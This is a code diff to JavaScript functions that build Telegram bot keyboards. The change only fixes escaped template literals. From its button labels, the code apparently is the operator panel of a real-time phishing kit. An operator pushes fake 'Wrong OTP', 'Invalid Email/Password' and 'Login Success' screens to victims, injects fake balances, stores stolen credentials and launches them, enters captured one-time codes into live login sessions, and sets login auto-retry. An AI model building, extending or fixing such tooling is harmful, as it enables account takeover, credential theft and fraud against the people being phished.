@@ -701,19 +701,19 @@ function tgUserActionKeyboard(userName) {
     const u = encodeURIComponent(userName);
     return {
         inline_keyboard: [
-            [{ text: '⚠️ Invalid Email/Password', callback_data: \`qt|invalid_login|\${u}\` },
-             { text: '🔢 Wrong OTP',              callback_data: \`qt|wrong_otp|\${u}\` }],
-            [{ text: '✅ Login Success',           callback_data: \`qt|login_ok|\${u}\` },
-             { text: '🚨 Account Alert',           callback_data: \`qt|alert|\${u}\` }],
-            [{ text: '📋 Instruction',             callback_data: \`qt|instruction|\${u}\` },
-             { text: '💬 Custom Message',          callback_data: \`ask_msg|\${u}\` }],
-            [{ text: '🔄 Force Reload',            callback_data: \`force_reload|\${u}\` },
-             { text: '⏳ Push Loading',            callback_data: \`push_loading|\${u}\` }],
-            [{ text: '💰 Inject Balance',          callback_data: \`ask_balance|\${u}\` },
-             { text: '👢 Kick User',               callback_data: \`kick|\${u}\` }],
-            [{ text: '🚫 Block',                   callback_data: \`block|\${u}\` },
-             { text: '✅ Unblock',                 callback_data: \`unblock|\${u}\` }],
-            [{ text: '📩 Inject: Credentials',     callback_data: \`inject_type_menu|\${u}\` }],
+            [{ text: '⚠️ Invalid Email/Password', callback_data: `qt|invalid_login|${u}` },
+             { text: '🔢 Wrong OTP',              callback_data: `qt|wrong_otp|${u}` }],
+            [{ text: '✅ Login Success',           callback_data: `qt|login_ok|${u}` },
+             { text: '🚨 Account Alert',           callback_data: `qt|alert|${u}` }],
+            [{ text: '📋 Instruction',             callback_data: `qt|instruction|${u}` },
+             { text: '💬 Custom Message',          callback_data: `ask_msg|${u}` }],
+            [{ text: '🔄 Force Reload',            callback_data: `force_reload|${u}` },
+             { text: '⏳ Push Loading',            callback_data: `push_loading|${u}` }],
+            [{ text: '💰 Inject Balance',          callback_data: `ask_balance|${u}` },
+             { text: '👢 Kick User',               callback_data: `kick|${u}` }],
+            [{ text: '🚫 Block',                   callback_data: `block|${u}` },
+             { text: '✅ Unblock',                 callback_data: `unblock|${u}` }],
+            [{ text: '📩 Inject: Credentials',     callback_data: `inject_type_menu|${u}` }],
             [{ text: '🔙 Back to Users',           callback_data: 'menu_users' }],
         ],
     };
@@ -723,13 +723,13 @@ function tgInjectTypeKeyboard(userName) {
     const u = encodeURIComponent(userName);
     return {
         inline_keyboard: [
-            [{ text: '⚠️ Invalid Login',  callback_data: \`qt|invalid_login|\${u}\` },
-             { text: '🔢 Wrong OTP',      callback_data: \`qt|wrong_otp|\${u}\` }],
-            [{ text: '✅ Login Success',   callback_data: \`qt|login_ok|\${u}\` },
-             { text: '🚨 Account Alert',  callback_data: \`qt|alert|\${u}\` }],
-            [{ text: '📋 Instruction',    callback_data: \`qt|instruction|\${u}\` }],
-            [{ text: '✏️ Custom Message', callback_data: \`ask_msg|\${u}\` }],
-            [{ text: '💰 Inject Balance', callback_data: \`ask_balance|\${u}\` }],
+            [{ text: '⚠️ Invalid Login',  callback_data: `qt|invalid_login|${u}` },
+             { text: '🔢 Wrong OTP',      callback_data: `qt|wrong_otp|${u}` }],
+            [{ text: '✅ Login Success',   callback_data: `qt|login_ok|${u}` },
+             { text: '🚨 Account Alert',  callback_data: `qt|alert|${u}` }],
+            [{ text: '📋 Instruction',    callback_data: `qt|instruction|${u}` }],
+            [{ text: '✏️ Custom Message', callback_data: `ask_msg|${u}` }],
+            [{ text: '💰 Inject Balance', callback_data: `ask_balance|${u}` }],
             [{ text: '🔙 Back',           callback_data: 'menu_inject' }],
         ],
     };
@@ -763,21 +763,21 @@ function tgSessionKeyboard(sessionId, status) {
     const s = sessionId;
     const kb = [];
     if (status === 'waiting_otp' || status === 'wrong_otp') {
-        kb.push([{ text: '🔢 Enter OTP', callback_data: \`ask_qxotp|\${s}|Session\` }]);
+        kb.push([{ text: '🔢 Enter OTP', callback_data: `ask_qxotp|${s}|Session` }]);
     }
     if (!['closed','error','logged_in'].includes(status)) {
-        kb.push([{ text: '🔄 Retry Login', callback_data: \`qxretry|\${s}\` }]);
+        kb.push([{ text: '🔄 Retry Login', callback_data: `qxretry|${s}` }]);
     }
-    kb.push([{ text: '❌ Close Session', callback_data: \`qxclose|\${s}\` }]);
-    kb.push([{ text: '📸 Screenshot',   callback_data: \`qx_shot|\${s}\` }]);
+    kb.push([{ text: '❌ Close Session', callback_data: `qxclose|${s}` }]);
+    kb.push([{ text: '📸 Screenshot',   callback_data: `qx_shot|${s}` }]);
     kb.push([{ text: '🔙 All Sessions', callback_data: 'qx_sessions' }]);
     return { inline_keyboard: kb };
 }
 
 function tgCredsKeyboard(creds) {
     const kb = creds.slice(0, 8).map(c => ([{
-        text: \`🔑 \${c.label || c.email.slice(0, 20)} [\${c.group}]\`,
-        callback_data: \`cred_action|\${c.id}\`
+        text: `🔑 ${c.label || c.email.slice(0, 20)} [${c.group}]`,
+        callback_data: `cred_action|${c.id}`
     }]));
     kb.push([
         { text: '➕ Add Credential', callback_data: 'cred_add' },
@@ -790,8 +790,8 @@ function tgCredsKeyboard(creds) {
 function tgCredActionKeyboard(credId) {
     return {
         inline_keyboard: [
-            [{ text: '🚀 Launch Now',    callback_data: \`cred_launch|\${credId}\` },
-             { text: '🗑️ Delete',        callback_data: \`cred_delete|\${credId}\` }],
+            [{ text: '🚀 Launch Now',    callback_data: `cred_launch|${credId}` },
+             { text: '🗑️ Delete',        callback_data: `cred_delete|${credId}` }],
             [{ text: '🔙 Back to Creds', callback_data: 'menu_creds' }],
         ],
     };
@@ -803,8 +803,8 @@ function tgRetryConfigKeyboard() {
         inline_keyboard: [
             [{ text: en ? '✅ Auto-Retry ENABLED — Disable' : '⚪ Auto-Retry DISABLED — Enable',
                callback_data: en ? 'retry_off' : 'retry_on' }],
-            [{ text: \`🔁 Max Attempts: \${autoRetryConfig.maxAttempts}\`, callback_data: 'retry_ask_attempts' }],
-            [{ text: \`⏱️ Delay: \${autoRetryConfig.delaySeconds}s\`,      callback_data: 'retry_ask_delay' }],
+            [{ text: `🔁 Max Attempts: ${autoRetryConfig.maxAttempts}`, callback_data: 'retry_ask_attempts' }],
+            [{ text: `⏱️ Delay: ${autoRetryConfig.delaySeconds}s`,      callback_data: 'retry_ask_delay' }],
             [{ text: '🔙 Back', callback_data: 'qx_sessions' }],
         ],
     };
